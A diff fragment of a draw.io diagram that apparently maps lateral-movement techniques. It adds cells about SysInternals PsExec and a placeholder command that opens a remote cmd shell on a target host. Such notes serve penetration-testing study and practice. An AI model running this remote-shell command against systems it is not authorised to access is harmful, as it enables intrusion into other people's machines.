+        <mxCell id="-mCO11fVwZeK89IVwwup-183" value="&lt;div&gt;&lt;b&gt;Using the New Process with PSExec (from the terminal of the process)&lt;/b&gt;&lt;/div&gt;" style="shape=process;whiteSpace=wrap;html=1;backgroundOutline=1;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-1620" y="1760" width="120" height="90" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-185" value="SysInternals" style="whiteSpace=wrap;html=1;rounded=0;fillColor=#dae8fc;strokeColor=#6c8ebf;" vertex="1" parent="1">
+          <mxGeometry x="-2070" y="1775" width="390" height="60" as="geometry" />
+        </mxCell>
+        <mxCell id="-mCO11fVwZeK89IVwwup-186" value="&lt;div&gt;C:\Tools&amp;gt; PSExec.exe -accepteula \\&amp;lt;tgt&amp;gt;.&amp;lt;fqdn&amp;gt; cmd&lt;/div&gt;" style="whiteSpace=wrap;html=1;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="-2070" y="1835" width="390" height="80" as="geometry" />
         </mxCell>
       </root>
     </mxGraphModel>
